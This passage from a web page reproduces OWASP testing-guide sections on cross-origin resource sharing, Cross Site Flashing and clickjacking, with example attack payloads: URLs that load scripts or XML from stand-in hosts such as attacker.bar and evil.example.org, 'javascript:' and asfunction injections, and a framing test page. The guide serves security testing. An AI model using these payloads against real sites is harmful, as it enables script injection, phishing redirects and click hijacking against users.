                    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"div1"</span><span class="nt">&gt;&lt;/div&gt;</span>
                <span class="nt">&lt;/body&gt;</span>
                </code></pre></div></div>
                
                <p>For example, a request like this will show the contents of the <code class="language-plaintext highlighter-rouge">profile.php</code> file:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://example.foo/main.php#profile.php</code></p>
                
                <p>Request and response generated by <code class="language-plaintext highlighter-rouge">http://example.foo/profile.php</code>:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /profile.php HTTP/1.1
                Host: example.foo
                [...]
                Referer: http://example.foo/main.php
                Connection: keep-alive
                
                HTTP/1.1 200 OK
                [...]
                Content-Length: 25
                Content-Type: text/html
                
                [Response Body]
                </code></pre></div></div>
                
                <p>Now, as there is no URL validation we can inject a remote script, that will be injected and executed in the context of the <code class="language-plaintext highlighter-rouge">example.foo</code> domain, with a URL like this:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.foo/main.php#http://attacker.bar/file.php
                </code></pre></div></div>
                
                <p>Request and response generated by <code class="language-plaintext highlighter-rouge">http://attacker.bar/file.php</code>:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /file.php HTTP/1.1
                Host: attacker.bar
                [...]
                Referer: http://example.foo/main.php
                origin: http://example.foo
                
                HTTP/1.1 200 OK
                [...]
                Access-Control-Allow-Origin: *
                Content-Length: 92
                Content-Type: text/html
                
                Injected Content from attacker.bar <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"#"</span> <span class="na">onerror=</span><span class="s">"alert('Domain: '+document.domain)"</span><span class="nt">&gt;</span>
                </code></pre></div></div>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt8Modal" tabindex="-1" role="dialog" aria-labelledby="clnt8ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt8ModalLabel">WSTG-CLNT-08 - Testing for Cross Site Flashing</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>ActionScript, based on ECMAScript, is the language used by Flash applications when dealing with interactive needs. There are three versions of the ActionScript language. ActionScript 1.0 and ActionScript 2.0 are very similar with ActionScript 2.0 being an extension of ActionScript 1.0. ActionScript 3.0, introduced with Flash Player 9, is a rewrite of the language to support object orientated design.</p>
                
                <p>ActionScript, like every other language, has some implementation patterns which could lead to security issues. In particular, since Flash applications are often embedded in browsers, vulnerabilities like DOM-based Cross Site Scripting (DOM XSS) could be present in flawed Flash applications.</p>
                
                <p>Cross-Site Flashing (XSF) is a vulnerability that has a similar impact to XSS.</p>
                
                <p>XSF occurs when the following scenarios are initiated from different domains:</p>
                
                <ul>
                  <li>One movie loads another movie with <code class="language-plaintext highlighter-rouge">loadMovie*</code> functions (or other hacks) and has access to the same sandbox, or part of it.</li>
                  <li>An HTML page uses JavaScript to command an Adobe Flash movie, for example, by calling:
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">GetVariable</code> to access Flash public and static objects from JavaScript as a string.</li>
                      <li><code class="language-plaintext highlighter-rouge">SetVariable</code> to set a static or public Flash object to a new string value with JavaScript.</li>
                    </ul>
                  </li>
                  <li>Unexpected communications between the browser and SWF application, which could result in stealing data from the SWF application.</li>
                </ul>
                
                <p>XSF may be performed by forcing a flawed SWF to load an external evil Flash file. This attack could result in XSS or in the modification of the GUI in order to fool a user to insert credentials on a fake Flash form. XSF could be used in the presence of Flash HTML Injection or external SWF files when <code class="language-plaintext highlighter-rouge">loadMovie*</code> methods are used.</p>
                
                <h3 id="open-redirectors">Open Redirectors</h3>
                
                <p>SWFs have the capability to navigate the browser. If the SWF takes the destination in as a FlashVar, then the SWF may be used as an open redirector. An open redirector is any piece of website functionality on a trusted website that an attacker can use to redirect the end user to a malicious website. These are frequently used within phishing attacks. Similar to cross-site scripting, the attack involves a user clicking on a malicious link.</p>
                
                <p>In the Flash case, the malicious URL might look like:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://trusted.example.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html
                </code></pre></div></div>
                
                <p>In the above example, an end user might see that the URL begins with their favorite trusted website and click on it. The link would load the trusted SWF which takes the <code class="language-plaintext highlighter-rouge">getURLValue</code> and provides it to an ActionScript browser navigation call:</p>
                
                <div class="language-actionscript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">getURL</span><span class="p">(</span><span class="nx">_root</span><span class="p">.</span><span class="nx">getURLValue</span><span class="p">,</span><span class="s2">"_self"</span><span class="p">)</span><span class="o">;</span>
                </code></pre></div></div>
                
                <p>This would navigate the browser to the malicious URL provided by the attacker. At this point, the phisher has successfully leveraged the trust the user has in trusted.example.org to trick the user into visiting their malicious website. From there, they could launch a 0-day, conduct spoofing of the original website, or any other type of attack. SWFs may unintentionally be acting as an open-redirector on the website.</p>
                
                <p>Developers should avoid taking full URLs as FlashVars. If they only plan to navigate within their own website, then they should use relative URLs or verify that the URL begins with a trusted domain and protocol.</p>
                
                <h3 id="attacks-and-flash-player-version">Attacks and Flash Player Version</h3>
                
                <p>Since May 2007, three new versions of Flash Player were released by Adobe. Every new version restricts some of the attacks previously described.</p>
                
                <table>
                  <thead>
                    <tr>
                      <th>Player Version</th>
                      <th><code class="language-plaintext highlighter-rouge">asfunction</code></th>
                      <th>ExternalInterface</th>
                      <th>GetURL</th>
                      <th>HTML Injection</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>v9.0 r47/48</td>
                      <td>Yes</td>
                      <td>Yes</td>
                      <td>Yes</td>
                      <td>Yes</td>
                    </tr>
                    <tr>
                      <td>v9.0 r115</td>
                      <td>No</td>
                      <td>Yes</td>
                      <td>Yes</td>
                      <td>Yes</td>
                    </tr>
                    <tr>
                      <td>v9.0 r124</td>
                      <td>No</td>
                      <td>Yes</td>
                      <td>Yes</td>
                      <td>Partially</td>
                    </tr>
                  </tbody>
                </table>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Decompile and analyze the application’s code.</li>
                  <li>Assess sinks inputs and unsafe method usages.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>Since the first publication of <a href="http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf">Testing Flash Applications</a>, new versions of Flash Player were released in order to mitigate some of the attacks which will be described. Nevertheless, some issues still remain exploitable because they are the result of insecure programming practices.</p>
                
                <h3 id="decompilation">Decompilation</h3>
                
                <p>Since SWF files are interpreted by a virtual machine embedded in the player itself, they can be potentially decompiled and analyzed. The most known and free ActionScript 2.0 decompiler is flare.</p>
                
                <p>To decompile a SWF file with flare just type:</p>
                
                <p><code class="language-plaintext highlighter-rouge">$&nbsp;flare&nbsp;hello.swf</code></p>
                
                <p>This results in a new file called hello.flr.</p>
                
                <p>Decompilation helps testers because it allows for white-box testing of the Flash applications. A quick web search can lead you to various disassmeblers and flash security tools.</p>
                
                <h3 id="undefined-variables-flashvars">Undefined Variables FlashVars</h3>
                
                <p>FlashVars are the variables that the SWF developer planned on receiving from the web page. FlashVars are typically passed in from the Object or Embed tag within the HTML. For instance:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;object</span> <span class="na">width=</span><span class="s">"550"</span> <span class="na">height=</span><span class="s">"400"</span> <span class="na">classid=</span><span class="s">"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"</span>
                <span class="na">codebase=</span><span class="s">"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"movie"</span> <span class="na">value=</span><span class="s">"somefilename.swf"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"FlashVars"</span> <span class="na">value=</span><span class="s">"var1=val1&amp;var2=val2"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;embed</span> <span class="na">src=</span><span class="s">"somefilename.swf"</span> <span class="na">width=</span><span class="s">"550"</span> <span class="na">height=</span><span class="s">"400"</span> <span class="na">FlashVars=</span><span class="s">"var1=val1&amp;var2=val2"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;/embed&gt;</span>
                <span class="nt">&lt;/object&gt;</span>
                </code></pre></div></div>
                
                <p>FlashVars can also be initialized from the URL:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://www.example.org/somefilename.swf?var1=val1&amp;var2=val2</code></p>
                
                <p>In ActionScript 3.0, a developer must explicitly assign the FlashVar values to local variables. Typically, this looks like:</p>
                
                <div class="language-actionscript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">paramObj</span><span class="o">:</span><span class="nb">Object</span> <span class="o">=</span> <span class="nx">LoaderInfo</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">root</span><span class="p">.</span><span class="nx">loaderInfo</span><span class="p">).</span><span class="nx">parameters</span><span class="o">;</span>
                <span class="kd">var</span> <span class="nx">var1</span><span class="o">:</span><span class="nx">String</span> <span class="o">=</span> <span class="nx">String</span><span class="p">(</span><span class="nx">paramObj</span><span class="p">[</span><span class="s2">"var1"</span><span class="p">])</span><span class="o">;</span>
                <span class="kd">var</span> <span class="nx">var2</span><span class="o">:</span><span class="nx">String</span> <span class="o">=</span> <span class="nx">String</span><span class="p">(</span><span class="nx">paramObj</span><span class="p">[</span><span class="s2">"var2"</span><span class="p">])</span><span class="o">;</span>
                </code></pre></div></div>
                
                <p>In ActionScript 2.0, any uninitialized global variable is assumed to be a FlashVar. Global variables are those variables that are prepended by <code class="language-plaintext highlighter-rouge">_root</code>, <code class="language-plaintext highlighter-rouge">_global</code> or <code class="language-plaintext highlighter-rouge">_level0</code>. This means that if an attribute like <code class="language-plaintext highlighter-rouge">_root.varname</code> is undefined throughout the code flow, it could be overwritten by URL parameters:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://victim/file.swf?varname=value</code></p>
                
                <p>Regardless of whether you are looking at ActionScript 2.0 or ActionScript 3.0, FlashVars can be a vector of attack. Let’s look at some ActionScript 2.0 code that is vulnerable:</p>
                
                <p>Example:</p>
                
                <div class="language-actionscript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">movieClip</span> <span class="mi">328</span> <span class="nx">__Packages</span><span class="p">.</span><span class="nx">Locale</span> <span class="p">{</span>
                
                <span class="err">#</span><span class="nx">initclip</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_global</span><span class="p">.</span><span class="nx">Locale</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">var</span> <span class="nx">v1</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">on_load</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kd">var</span> <span class="nx">v5</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XML</span><span class="p">()</span><span class="o">;</span>
                        <span class="kd">var</span> <span class="nx">v6</span> <span class="o">=</span> <span class="k">this</span><span class="o">;</span>
                        <span class="nx">v5</span><span class="p">.</span><span class="nx">onLoad</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">success</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nx">success</span><span class="p">)</span> <span class="p">{</span>
                            <span class="kr">trace</span><span class="p">(</span><span class="s1">'Locale loaded xml'</span><span class="p">)</span><span class="o">;</span>
                            <span class="kd">var</span> <span class="nx">v3</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">xliff</span><span class="p">.</span><span class="nx">file</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">$trans_unit</span><span class="o">;</span>
                            <span class="kd">var</span> <span class="nx">v2</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
                            <span class="k">while</span> <span class="p">(</span><span class="nx">v2</span> <span class="o">&lt;</span> <span class="nx">v3</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
                            <span class="nx">Locale</span><span class="p">.</span><span class="nx">strings</span><span class="p">[</span><span class="nx">v3</span><span class="p">[</span><span class="nx">v2</span><span class="p">].</span><span class="nx">_resname</span><span class="p">]</span> <span class="o">=</span> <span class="nx">v3</span><span class="p">[</span><span class="nx">v2</span><span class="p">].</span><span class="nx">source</span><span class="p">.</span><span class="nx">__text</span><span class="o">;</span>
                            <span class="o">++</span><span class="nx">v2</span><span class="o">;</span>
                            <span class="p">}</span>
                            <span class="nx">on_load</span><span class="p">()</span><span class="o">;</span>
                        <span class="p">}</span> <span class="k">else</span> <span class="p">{}</span>
                        <span class="p">}</span><span class="o">;</span>
                        <span class="k">if</span> <span class="p">(</span><span class="nx">_root</span><span class="p">.</span><span class="nx">language</span> <span class="o">!=</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">Locale</span><span class="p">.</span><span class="nx">DEFAULT_LANG</span> <span class="o">=</span> <span class="nx">_root</span><span class="p">.</span><span class="nx">language</span><span class="o">;</span>
                        <span class="p">}</span>
                        <span class="nx">v5</span><span class="p">.</span><span class="nx">load</span><span class="p">(</span><span class="nx">Locale</span><span class="p">.</span><span class="nx">DEFAULT_LANG</span> <span class="o">+</span> <span class="s1">'/player_'</span> <span class="o">+</span>
                                            <span class="nx">Locale</span><span class="p">.</span><span class="nx">DEFAULT_LANG</span> <span class="o">+</span> <span class="s1">'.xml'</span><span class="p">)</span><span class="o">;</span>
                    <span class="p">}</span><span class="o">;</span>
                </code></pre></div></div>
                
                <p>The above code could be attacked by requesting:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://victim/file.swf?language=http://evil.example.org/malicious.xml?</code></p>
                
                <h3 id="unsafe-methods">Unsafe Methods</h3>
                
                <p>When an entry point is identified, the data it represents could be used by unsafe methods. If the data is not filtered or validated, it could lead to some vulnerabilities.</p>
                
                <p>Unsafe Methods since version r47 are:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">loadVariables()</code></li>
                  <li><code class="language-plaintext highlighter-rouge">loadMovie()</code></li>
                  <li><code class="language-plaintext highlighter-rouge">getURL()</code></li>
                  <li><code class="language-plaintext highlighter-rouge">loadMovie()</code></li>
                  <li><code class="language-plaintext highlighter-rouge">loadMovieNum()</code></li>
                  <li><code class="language-plaintext highlighter-rouge">FScrollPane.loadScrollContent()</code></li>
                  <li><code class="language-plaintext highlighter-rouge">LoadVars.load</code></li>
                  <li><code class="language-plaintext highlighter-rouge">LoadVars.send</code></li>
                  <li><code class="language-plaintext highlighter-rouge">XML.load ( 'url' )</code></li>
                  <li><code class="language-plaintext highlighter-rouge">LoadVars.load ( 'url' )</code></li>
                  <li><code class="language-plaintext highlighter-rouge">Sound.loadSound( 'url' , isStreaming );</code></li>
                  <li><code class="language-plaintext highlighter-rouge">NetStream.play( 'url' );</code></li>
                  <li><code class="language-plaintext highlighter-rouge">flash.external.ExternalInterface.call(_root.callback)</code></li>
                  <li><code class="language-plaintext highlighter-rouge">htmlText</code></li>
                </ul>
                
                <h3 id="exploitation-by-reflected-xss">Exploitation by Reflected XSS</h3>
                
                <p>The swf file should be hosted on the victim’s host, and the techniques of reflected XSS must be used. An attacker forces the browser to load a pure swf file directly in the location bar (by redirection or social engineering) or by loading it through an iframe from an evil page:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">'http://victim/path/to/file.swf'</span><span class="nt">&gt;&lt;/iframe&gt;</span>
                </code></pre></div></div>
                
                <p>In this situation, the browser will self-generate an HTML page as if it were hosted by the victim host.</p>
                
                <h3 id="geturl-as2--navigatetourl-as3">GetURL (AS2) / NavigateToURL (AS3)</h3>
                
                <p>The GetURL function in ActionScript 2.0 and NavigateToURL in ActionScript 3.0 lets the movie load a URI into the browser’s window. If an undefined variable is used as the first argument for getURL:</p>
                
                <p><code class="language-plaintext highlighter-rouge">getURL(_root.URI,'_targetFrame');</code></p>
                
                <p>Or if a FlashVar is used as the parameter that is passed to a navigateToURL function:</p>
                
                <div class="language-actionscript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span><span class="err">&nbsp;</span><span class="nx">request</span><span class="o">:</span><span class="nx">URLRequest</span><span class="err">&nbsp;</span><span class="o">=</span><span class="err">&nbsp;</span><span class="k">new</span><span class="err">&nbsp;</span><span class="nx">URLRequest</span><span class="p">(</span><span class="nx">FlashVarSuppliedURL</span><span class="p">)</span><span class="o">;</span>
                <span class="nx">navigateToURL</span><span class="p">(</span><span class="nx">request</span><span class="p">)</span><span class="o">;</span>
                </code></pre></div></div>
                
                <p>Then this will mean it’s possible to call JavaScript in the same domain where the movie is hosted by requesting:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://victim/file.swf?URI=javascript:evilcode</code></p>
                
                <p><code class="language-plaintext highlighter-rouge">getURL('javascript:evilcode','_self');</code></p>
                
                <p>The same is possible when only some part of <code class="language-plaintext highlighter-rouge">getURL</code> is controlled via DOM injection with Flash JavaScript injection:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">getUrl</span><span class="p">(</span><span class="dl">'</span><span class="s1">javascript:function(</span><span class="dl">'</span><span class="o">+</span><span class="nx">_root</span><span class="p">.</span><span class="nx">arg</span><span class="o">+</span><span class="dl">'</span><span class="s1">)</span><span class="dl">'</span><span class="p">)</span>
                </code></pre></div></div>
                
                <h3 id="using-asfunction">Using <code class="language-plaintext highlighter-rouge">asfunction</code></h3>
                
                <p>You can use the special <code class="language-plaintext highlighter-rouge">asfunction</code> protocol to cause the link to execute an ActionScript function in a SWF file instead of opening a URL. Until release Flash Player 9 r48 <code class="language-plaintext highlighter-rouge">asfunction</code> could be used on every method which has a URL as an argument. After that release, <code class="language-plaintext highlighter-rouge">asfunction</code> was restricted to use within an HTML TextField.</p>
                
                <p>This means that a tester could try to inject:</p>
                
                <div class="language-actionscript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">asfunction</span><span class="o">:</span><span class="nx">getURL</span><span class="p">,</span><span class="nx">javascript</span><span class="o">:</span><span class="nx">evilcode</span>
                </code></pre></div></div>
                
                <p>in every unsafe method, such as:</p>
                
                <div class="language-actionscript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">loadMovie</span><span class="p">(</span><span class="nx">_root</span><span class="p">.</span><span class="nx">URL</span><span class="p">)</span>
                </code></pre></div></div>
                
                <p>by requesting:</p>
                
                <p><code class="language-plaintext highlighter-rouge">http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode</code></p>
                
                <h3 id="externalinterface">ExternalInterface</h3>
                
                <p><code class="language-plaintext highlighter-rouge">ExternalInterface.call</code> is a static method introduced by Adobe to improve player/browser interaction for both ActionScript 2.0 and ActionScript 3.0.</p>
                
                <p>From a security point of view it could be abused when part of its argument could be controlled:</p>
                
                <div class="language-actionscript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">flash</span><span class="p">.</span><span class="nx">external</span><span class="p">.</span><span class="nx">ExternalInterface</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="nx">_root</span><span class="p">.</span><span class="nx">callback</span><span class="p">)</span><span class="o">;</span>
                </code></pre></div></div>
                
                <p>the attack pattern for this kind of flaw may be something like the following:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span><span class="p">(</span><span class="nx">evilcode</span><span class="p">)</span>
                </code></pre></div></div>
                
                <p>since the internal JavaScript that is executed by the browser will be something similar to:</p>
                
                <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">eval</span><span class="p">(</span><span class="dl">'</span><span class="s1">try { __flash__toXML(</span><span class="dl">'</span><span class="o">+</span><span class="nx">__root</span><span class="p">.</span><span class="nx">callback</span><span class="o">+</span><span class="dl">'</span><span class="s1">) ; } catch (e) { "&lt;undefined/&gt;"; }</span><span class="dl">'</span><span class="p">)</span>
                </code></pre></div></div>
                
                <h3 id="html-injection">HTML Injection</h3>
                
                <p>TextField Objects can render minimal HTML by setting:</p>
                
                <div class="language-actionscript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">tf</span><span class="p">.</span><span class="nx">html</span> <span class="o">=</span> <span class="kc">true</span>
                <span class="nx">tf</span><span class="p">.</span><span class="nx">htmlText</span> <span class="o">=</span> <span class="s1">'&lt;tag&gt;text&lt;/tag&gt;'</span>
                </code></pre></div></div>
                
                <p>So if some part of text could be controlled by the tester, an <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> tag or an image tag could be injected resulting in modifying the GUI or a XSS attack on the browser.</p>
                
                <p>Some attack examples with <code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> tag:</p>
                
                <ul>
                  <li>Direct XSS: <code class="language-plaintext highlighter-rouge">&lt;a href='javascript:alert(123)'&gt;</code></li>
                  <li>Call a function: <code class="language-plaintext highlighter-rouge">&lt;a href='asfunction:function,arg'&gt;</code></li>
                  <li>Call SWF public functions: <code class="language-plaintext highlighter-rouge">&lt;a href='asfunction:_root.obj.function, arg'&gt;</code></li>
                  <li>Call native static as function: <code class="language-plaintext highlighter-rouge">&lt;a href='asfunction:System.Security.allowDomain,evilhost'&gt;</code></li>
                </ul>
                
                <p>An image tag could be used as well:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'http://evil/evil.swf'</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <p>In this example, <code class="language-plaintext highlighter-rouge">.swf</code> is necessary to bypass the Flash Player internal filter:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">'javascript:evilcode//.swf'</span><span class="nt">&gt;</span>
                </code></pre></div></div>
                
                <p>Since the release of Flash Player 9.0.124.0, XSS is no longer exploitable, but GUI modification could still be accomplished.</p>
                
                <p>The following tools may be helpful in working with SWF:</p>
                
                <ul>
                  <li><a href="https://labs.adobe.com/technologies/swfinvestigator/">Adobe SWF Investigator</a></li>
                  <li><a href="https://wiki.owasp.org/index.php/Category:SWFIntruder">OWASP SWFIntruder</a></li>
                  <li><a href="http://www.nowrap.de/flare.html">Decompiler – Flare</a></li>
                  <li><a href="http://flasm.sourceforge.net/">Disassembler – Flasm</a></li>
                  <li><a href="https://www.swfmill.org/">Swfmill – Convert Swf to XML and vice versa</a></li>
                </ul>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="clnt9Modal" tabindex="-1" role="dialog" aria-labelledby="clnt9ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="clnt9ModalLabel">WSTG-CLNT-09 - Testing for Clickjacking</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Clickjacking, a subset of UI redressing, is a malicious technique whereby a web user is deceived into interacting (in most cases by clicking) with something other than what the user believes they are interacting with. This type of attack, either alone or in conjunction with other attacks, could potentially send unauthorized commands or reveal confidential information while the victim is interacting with seemingly-harmless web pages. The term clickjacking was coined by Jeremiah Grossman and Robert Hansen in 2008.</p>
                
                <p>A clickjacking attack uses seemingly-harmless features of HTML and JavaScript to force the victim to perform undesired actions, such as clicking an invisible button that performs an unintended operation. This is a client-side security issue that affects a variety of browsers and platforms.</p>
                
                <p>To carry out this attack, an attacker creates a seemingly-harmless web page that loads the target application through the use of an inline frame (concealed with CSS code). Once this is done, an attacker may induce the victim to interact with the web page by other means (through, for example, social engineering). Like other attacks, a common prerequisite is that the victim is authenticated against the attacker’s target website.</p>
            
                
                <p>The victim surfs the attacker’s web page with the intention of interacting with the visible user interface, but is inadvertently performing actions on the hidden page. Using the hidden page, an attacker can deceive users into performing actions they never intended to perform through the positioning of the hidden elements in the web page.</p>
                
                
                <p>The power of this method is that the actions performed by the victim are originated from the hidden but authentic target web page. Consequently, some of the anti-CSRF protections deployed by the developers to protect the web page from CSRF attacks could be bypassed.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Understand security measures in place.</li>
                  <li>Assess how strict the security measures are and if they are bypassable.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>As mentioned above, this type of attack is often designed to allow an attacker to induce users’ actions on the target site, even if anti-CSRF tokens are being used. Testing should be conducted to determine if website pages are vulnerable to clickjacking attacks.</p>
                
                <p>Testers may investigate if a target page can be loaded in an inline frame by creating a simple web page that includes a frame containing the target web page. An example of HTML code to create this testing web page is displayed in the following snippet:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
                    <span class="nt">&lt;head&gt;</span>
                        <span class="nt">&lt;title&gt;</span>Clickjack test page<span class="nt">&lt;/title&gt;</span>
                    <span class="nt">&lt;/head&gt;</span>
                    <span class="nt">&lt;body&gt;</span>
                        <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://www.target.site"</span> <span class="na">width=</span><span class="s">"500"</span> <span class="na">height=</span><span class="s">"500"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
                    <span class="nt">&lt;/body&gt;</span>
                <span class="nt">&lt;/html&gt;</span>
                </code></pre></div></div>
                
                <p>If the <code class="language-plaintext highlighter-rouge">http://www.target.site</code> page is successfully loaded into the frame, then the site is vulnerable and has no type of protection against clickjacking attacks.</p>
                
                <h3 id="bypass-clickjacking-protection">Bypass Clickjacking Protection</h3>
                
                <p>If the <code class="language-plaintext highlighter-rouge">http://www.target.site</code> page does not appear in the inline frame, the site probably has some form of protection against clickjacking. It’s important to note that this isn’t a guarantee that the page is totally immune to clickjacking.</p>
                
                <p>Methods to protect a web page from clickjacking can be divided into a few main mechanisms. It is possible to bypass these methods in some circumstances by employing specific workarounds. For further OWASP resources on clickjacking defense, see the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html">OWASP Clickjacking Defense Cheat Sheet</a>.</p>
                
                <h4 id="client-side-protection-frame-busting">Client-side Protection: Frame Busting</h4>
                
                <p>The most common client-side method, that has been developed to protect a web page from clickjacking, is called Frame Busting and it consists of a script in each page that should not be framed. The aim of this technique is to prevent a site from functioning when it is loaded inside a frame.</p>
                
                <p>The structure of frame busting code typically consists of a “conditional statement” and a “counter-action” statement. For this type of protection, there are some work arounds that fall under the name of “Bust frame busting”. Some of this techniques are browser-specific while others work across browsers.</p>
                
                <h5 id="mobile-website-version">Mobile Website Version</h5>
                
                <p>Mobile versions of the website are usually smaller and faster than the desktop ones, and they have to be less complex than the main application. Mobile variants have often less protection since there is the wrong assumption that an attacker could not attack an application by the smart phone. This is fundamentally wrong, because an attacker can fake the real origin given by a web browser, such that a non-mobile victim may be able to visit an application made for mobile users. From this assumption follows that in some cases it is not necessary to use techniques to evade frame busting when there are unprotected alternatives, which allow the use of same attack vectors.</p>
                
                <h5 id="double-framing">Double Framing</h5>
                
                <p>Some frame busting techniques try to break frame by assigning a value to the <code class="language-plaintext highlighter-rouge">parent.location</code> attribute in the “counter-action” statement.</p>
                
                <p>Such actions are, for example:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">self.parent.location</code> = <code class="language-plaintext highlighter-rouge">document.location</code></li>
                  <li><code class="language-plaintext highlighter-rouge">parent.location.href</code> = <code class="language-plaintext highlighter-rouge">self.location</code></li>
                  <li><code class="language-plaintext highlighter-rouge">parent.location</code> = <code class="language-plaintext highlighter-rouge">self.location</code></li>
                </ul>
                
                <p>This method works well until the target page is framed by a single page. However, if the attacker encloses the target web page in one frame which is nested in another one (a double frame), then trying to access to <code class="language-plaintext highlighter-rouge">parent.location</code> becomes a security violation in all popular browsers, due to the descendant frame navigation policy. This security violation disables the counter-action navigation.</p>
                
                <p>Target site frame busting code (<code class="language-plaintext highlighter-rouge">example.org</code>):</p>
                
                <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="nx">top</span><span class="p">.</span><span class="nx">location</span><span class="o">!=</span><span class="nb">self</span><span class="p">.</span><span class="nx">locaton</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">parent</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="nb">self</span><span class="p">.</span><span class="nx">location</span><span class="p">;</span>
                <span class="p">}</span>
                </code></pre></div></div>
                
